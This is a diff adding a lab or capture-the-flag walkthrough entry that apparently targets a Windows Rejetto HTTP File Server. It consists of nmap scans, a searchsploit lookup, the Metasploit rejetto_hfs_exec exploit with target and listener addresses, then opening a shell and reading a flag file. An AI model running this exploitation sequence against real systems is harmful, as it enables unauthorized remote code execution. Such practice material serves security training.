@@ -1082,8 +1082,24 @@ wmap_run -t
 wmap_run -e
 
 ```
-
-
+57) Windows: HTTP File Server
+    
+```
+cat /root/Desktop/target
+nmap --top-ports 65536 10.0.0.99
+nmap -sV -p 80 10.0.0.99
+searchsploit hfs
+msfconsole
+use exploit/windows/http/rejetto_hfs_exec
+set RPORT 80
+set RHOSTS 10.0.0.99
+set LHOST 10.10.0.4 <Make Sure to Enter Valid LHOST IP Address>
+exploit
+shell
+cd /
+dir
+type flag.txt
+```
 
 
 
